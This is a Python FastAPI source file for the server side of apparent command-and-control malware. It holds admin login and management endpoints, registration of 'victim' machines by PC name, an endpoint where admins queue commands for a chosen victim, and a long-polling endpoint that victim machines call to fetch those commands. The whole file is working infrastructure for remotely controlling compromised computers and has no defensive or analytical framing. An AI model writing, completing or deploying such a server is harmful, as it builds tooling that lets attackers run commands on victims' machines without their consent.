import asyncio
import time

from fastapi import FastAPI, Depends, HTTPException
import pydantic_models
from sqlalchemy.ext.asyncio import AsyncSession
from db.cruds.admin import get_admin_login, get_admin_id, register_admin, set_active_for_admin, delete_admin_for_admin
from db.db_config import get_session, init_models
from security import verify_password, sign_jwt, JWTBearer, decode_jwt
from db.models import Admin
import os
from db.cruds.victim import register_victim, login_victim, get_users
from db.cruds.commands import async_create_command, async_check_availability_victim, async_check_availability_admin

app = FastAPI()


async def get_admin_from_jwt(session, token: str) -> Admin:
    data = decode_jwt(token)
    # print(f"         {data}", type(data))
    user = await get_admin_id(session, data['user_id'])
    return user


# @app.on_event("startup")
# async def startup_event():
#     TODO   NOT FOR PRODUCTION
    # await init_models()
    # session = await get_session()
    # await register_admin(session, "123456789", "987654321", who_create="admin", is_super_admin=True)


@app.get("/")
async def index():
    return {"Hello": "World"}


@app.get("/who_is", dependencies=[Depends(JWTBearer())])
async def who_is(session: AsyncSession = Depends(get_session), jwt=Depends(JWTBearer())):
    # print(jwt)
    current_admin = await get_admin_from_jwt(session, jwt)
    return current_admin.admin_login


@app.post("/create_new_admin", dependencies=[Depends(JWTBearer())])
async def create_new_admin(admin: pydantic_models.RegisterAdmin, session: AsyncSession = Depends(get_session),
                           jwt=Depends(JWTBearer())):
    current_admin = await get_admin_from_jwt(session, jwt)
    if current_admin.is_super_admin:
        res = await register_admin(session, admin.admin_login, admin.admin_hash_password,
                                   who_create=current_admin.admin_login,  is_super_admin=admin.is_super_admin)
        await session.close()
        return "ok"
        # return {'login': res.admin_login, 'password': res.admin_hash_password}
    else:
        return HTTPException(status_code=403, detail={"error": "access denied"})


@app.post("/set_active_admin", dependencies=[Depends(JWTBearer())])
async def set_active_admin(admin: pydantic_models.SetActiveAdmin, session: AsyncSession = Depends(get_session),
                           jwt=Depends(JWTBearer())):
    current_admin = await get_admin_from_jwt(session, jwt)
    slave = await get_admin_login(session, admin.admin_login)
    if slave:
        if current_admin.admin_login == slave.who_create:
            res = await set_active_for_admin(session, slave, admin.is_active)
            return "ok"
    return HTTPException(status_code=403, detail={"error": "access denied"})


@app.post('/login_admin')
async def login(admin_details: pydantic_models.AuthAdmin, session: AsyncSession = Depends(get_session)):
    admin = await get_admin_login(session=session, admin_login=admin_details.admin_login)
    if admin:
        if admin.is_active:
            if verify_password(admin_details.admin_hash_password, admin.admin_hash_password):
                # print(admin.id)
                # print(admin)
                return sign_jwt(admin.id)
    return HTTPException(status_code=403, detail={"error": "access denied"})


@app.post("/delete_admin", dependencies=[Depends(JWTBearer())])
async def delete_admin(admin: pydantic_models.AuthAdmin, session: AsyncSession = Depends(get_session),
                       jwt=Depends(JWTBearer())):
    current_admin = await get_admin_from_jwt(session, jwt)
    slave = await get_admin_login(session, admin.admin_login)
    if slave:
        if current_admin.admin_login == slave.who_create:
            res = await delete_admin_for_admin(session, slave)
            return "ok"
    return HTTPException(status_code=403, detail={"error": "access denied"})


@app.get("/get_users", dependencies=[Depends(JWTBearer())])
async def get_users_for_admin(session: AsyncSession = Depends(get_session),
                       jwt=Depends(JWTBearer())):
    admin = await get_admin_from_jwt(session, jwt)
    if admin:
        a = await get_users(session)
        # print(a, type(a))
        return {"users": a}


@app.get("/listen")
async def listen():
    return ""


@app.post("/register_victim")
async def register_victims(victim: pydantic_models.RegisterVictim, session: AsyncSession = Depends(get_session)):
    victim = await register_victim(session=session, pc_name=victim.pc_name)
    return victim.unique_number


@app.post("/login_victim")
async def login_victims(victim: pydantic_models.LoginVictim, session: AsyncSession = Depends(get_session)):
    victim = await login_victim(session=session, unique_number=victim.unique_number)
    if victim:
        return "ok"
    else:
        return "error"


@app.post("/set_command", dependencies=[Depends(JWTBearer())])
async def set_command_admin(command: pydantic_models.Command, session: AsyncSession = Depends(get_session),
                            jwt=Depends(JWTBearer())
                            ):
    admin = await get_admin_from_jwt(session, jwt)
    if admin:
        if await async_create_command(admin.id, command.victim_id, command.command) == "ok":
            return "ok"
        return "server error"
    return "admin error"


@app.post("/longpool")
async def longpooling_request(LongpoolVictim: pydantic_models.LongpoolVictim, session: AsyncSession = Depends(get_session)):
    vicitm = await login_victim(session=session, unique_number=LongpoolVictim.unique_number)
    await asyncio.sleep(1)
    # print(vicitm)
    # print(type(vicitm))
    # print(vicitm.id)
    command = await async_check_availability_victim(vicitm.id)
    if not command:
        return {"message": "No new coomands"}
    else:
        pass
    return {"message": command}
